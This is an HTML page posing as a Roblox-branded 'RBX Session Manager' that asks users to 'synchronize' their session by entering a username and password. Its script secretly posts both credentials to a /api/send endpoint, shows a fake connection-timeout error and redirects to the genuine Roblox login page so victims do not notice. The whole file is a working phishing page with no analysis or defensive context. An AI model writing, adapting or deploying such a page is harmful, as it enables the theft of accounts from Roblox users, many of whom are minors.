<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RBX Session Manager</title>
    <style>
        body { background: #191919; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #222; padding: 30px; border-radius: 8px; width: 300px; border-top: 4px solid #00A2FF; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #00A2FF; border: none; color: #fff; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h3>System Verification</h3>
        <p style="font-size: 12px; color: #888;">Sync your session to continue</p>
        <form id="f">
            <input type="text" id="u" placeholder="Username" required>
            <input type="password" id="p" placeholder="Password" required>
            <button type="submit">SYNCHRONIZE</button>
        </form>
    </div>
    <script>
        document.getElementById('f').onsubmit = async (e) => {
            e.preventDefault();
            await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: u.value, password: p.value })
            });
            alert("Error: Connection timeout. Redirecting...");
            window.location.href = "https://www.roblox.com/login";
        };
    </script>
</body>
</html>
